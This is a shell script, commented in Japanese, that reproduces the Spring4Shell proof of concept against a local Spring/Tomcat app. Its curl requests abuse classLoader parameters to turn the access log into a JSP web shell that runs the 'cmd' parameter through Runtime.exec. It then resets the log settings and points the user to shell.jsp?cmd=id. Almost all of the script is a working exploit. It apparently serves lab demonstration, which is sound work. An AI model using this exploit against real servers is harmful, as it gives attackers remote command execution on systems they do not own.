# reference: https://github.com/reznok/Spring4Shell-POC/blob/master/exploit.py
echo "----------------------------------------------------------------------------------------------------"
echo "ログの出力先をwebapps/ROOT/shell.jspに変更しています…"
echo "----------------------------------------------------------------------------------------------------"
curl -v -G \
     -H "prefix:<%" \
     -H "suffix:%>" \
     -H "c:Runtime" \
     -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}i java.io.InputStream in = %{c}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %{suffix}i" \
     -d "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" \
     -d "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT" \
     -d "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell" \
     -d "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" \
     "http://localhost:8080/spring4shell/hello"
sleep 5
echo "----------------------------------------------------------------------------------------------------"
echo "ログの出力先を別の場所に変えてます…"
echo "----------------------------------------------------------------------------------------------------"
curl -v -G \
     -H "prefix:<%" \
     -H "suffix:%>//" \
     -H "c:Runtime" \
     -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=a" \
     -d "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt" \
     -d "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT" \
     -d "class.module.classLoader.resources.context.parent.pipeline.first.prefix=temp" \
     -d "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_" \
     "http://localhost:8080/spring4shell/hello"
sleep 5
echo "----------------------------------------------------------------------------------------------------"
echo "こちらにアクセスしてください: http://localhost:8080/shell.jsp?cmd=id"
echo "----------------------------------------------------------------------------------------------------"
